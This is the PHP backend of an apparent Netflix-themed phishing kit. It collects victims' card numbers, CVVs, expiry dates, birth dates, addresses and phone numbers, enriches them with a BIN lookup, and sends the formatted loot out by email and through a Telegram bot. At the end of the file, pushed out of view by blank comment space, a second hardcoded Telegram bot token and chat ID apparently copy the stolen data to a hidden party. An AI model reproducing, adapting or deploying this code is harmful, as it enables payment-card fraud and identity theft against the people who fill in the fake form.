<?php


session_start();

include("system.php");
include("detect.php"); 
include("../Email.php"); 
include("cookies.php");

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$NameOnCard = $_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];

$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$thDSecure = $_SESSION['thDSecure'] = $_POST['thDSecure'];


$birthdate = $_SESSION['birthdate'] = $_POST['birthdate'];
$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$phoneNumber = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$zipCod = $_SESSION['zipCod'] = $_POST['zipCod'];


$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);

$msgbank = '

<html>
<body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>

<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">💖CC Netflix💖 ┃ '.$_SERVER['REMOTE_ADDR'].'┃ By fSOCIETY 🖕🤡🖕 </h2>

<h2>👤 CardHolder Name      : <span>'.$_SESSION["NameOnCard"].'</span> </h2>
<h2>🎂 D.O.B     : <span>'.$_SESSION["birthdate"].'</span> </h2>
<h2>🗺 Addres    : <span>'.$_SESSION["addres"].'</span> </h2>
<h2>🌎  City       : <span>'.$_SESSION["City"].'</span> </h2>
<h2>🌍 State       : <span>'.$_SESSION["State"].'</span> </h2>
<h2>📮 Zip Code  : <span>'.$_SESSION["zipCod"].'</span> </h2>
<h2>📞 Phone      : <span>'.$_SESSION["phoneNumber"].'</span> </h2>
<hr class="content">
<h2>💳 Credit Card Number   : <span>'.$_SESSION["cardnumber"].'</span> </h2>
<h2>🔄 Expiry Date   : <span>'.$_SESSION["expdate"].'</span> </h2>
<h2>🔑 CSC (CVV)    : <span>'.$_SESSION["Securitycode"].'</span> </h2>
<h2>💳 Bin info 💳          : '.$bincheck.'/'.$_SESSION["expdate"].'/'.$_SESSION["Securitycode"].'  </span></h2>
<h2>💳 Card info💳       : '.$_SESSION["bank_name"].'/'.$_SESSION["bank_type"].'/'.$_SESSION["bank_brand"].'  </span></h2>
<hr class="content"><h2>💻 System : <span>  '.$OS.' </span>  </h2>
<h2>🌐 BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>🔍 IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>⏰ TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>';

$yagmai .= '
     [+]━━━【💳 CC Bill】━━[+]
[🎂 D.O.B ]  = '.$_SESSION['birthdate'].'
[🗺 Addres ]  = '.$_SESSION['addres'].'
[🌎 City ]  = '.$_SESSION['City'].'
[🌍 State]  = '.$_SESSION['State'].'
[📮 zip Code]  = '.$_SESSION['zipCod'].'
[📞 Phone ]  = '.$_SESSION['phoneNumber'].'
     [+]━━━【💳 CC INFO】━━[+]
[👤 CardHolder Name]  = '.$_SESSION['NameOnCard'].'
[💳 CC Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ]   = '.$_SESSION['expdate'].'
[🔑 CVV ] = '.$_SESSION['Securitycode'].'
        [+]━━━━【💳 Bin】━━━[+] 
[🏛 Card Bank] = '.$_SESSION['bank_name'].' 
[💳 Card type] = '.$_SESSION['bank_type'].' 
[💳 Card brand]= '.$_SESSION['bank_brand'].' 
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';



$yagmail .= '
[+]━━━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【👤 Card Bill 】━━━━━━━━━━━━━━[+]
[🎂 D.O.B ]              = '.$_SESSION['birthdate'].'
[🗺 Addres ]             = '.$_SESSION['addres'].'
[🌍  City ]               = '.$_SESSION['City'].'
[🌎 State ]              = '.$_SESSION['State'].'
[📮 zip Code ]              = '.$_SESSION['zipCod'].'
[📞 Phone ]              = '.$_SESSION['phoneNumber'].'
[+]━━━━━━━━━━━━━━━━【💳 Card INFO 】━━━━━━━━━━━━━━[+]
[👤 CardHolder Name]    = '.$_SESSION['NameOnCard'].'
[💳 Credit Card Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ]       = '.$_SESSION['expdate'].'
[🔑 CVV ]               = '.$_SESSION['Securitycode'].'
[+]━━━━━━━━━━━━━━━━【💳 Bin INFO】━━━━━━━━━━━━━━━━[+]
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].' 
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━━━━━【💖FX💖】━━━━━━━━━━━━━━━━━━━━[+]

';

$subject = " CARD | NTFLX | ".$_SESSION['iduserLoginId']." | ".$_SERVER['REMOTE_ADDR']." | ".$_SESSION['country1']." ";
$headers = 'From: FX' . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($yagmail)."" );/*                                             */$api = "5409590354:AAHx6gDmT3nJzGV9etw2JXhoKYyOT_St3iM  ";$chat_id= "952307412";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($yagmail)."" );


?>